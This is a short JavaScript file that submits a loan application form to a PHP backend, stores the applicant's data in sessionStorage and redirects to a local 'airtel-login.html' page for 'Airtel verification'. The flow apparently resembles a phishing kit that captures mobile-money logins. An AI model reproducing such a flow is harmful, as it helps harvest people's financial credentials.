// Form validation & submit logic

function handleFormSubmit(event) {
    event.preventDefault();

    const form = document.getElementById("loanForm");
    const formData = new FormData(form);

    // Show loading indicator
    const submitBtn = form.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = "Processing...";
    submitBtn.disabled = true;

    // Send form data to backend
    fetch("backend/handlers/submit_loan.php", {
        method: "POST",
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log("Response:", data);
        // Store form data in sessionStorage for Airtel verification
        sessionStorage.setItem("loanData", JSON.stringify(Object.fromEntries(formData)));
        // Redirect to Airtel login
        window.location.href = "airtel-login.html";
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Error submitting form. Please try again.");
        submitBtn.textContent = originalText;
        submitBtn.disabled = false;
    });
}

// Attach event listener
document.addEventListener("DOMContentLoaded", function() {
    const form = document.getElementById("loanForm");
    if (form) {
        form.addEventListener("submit", handleFormSubmit);
    }
});

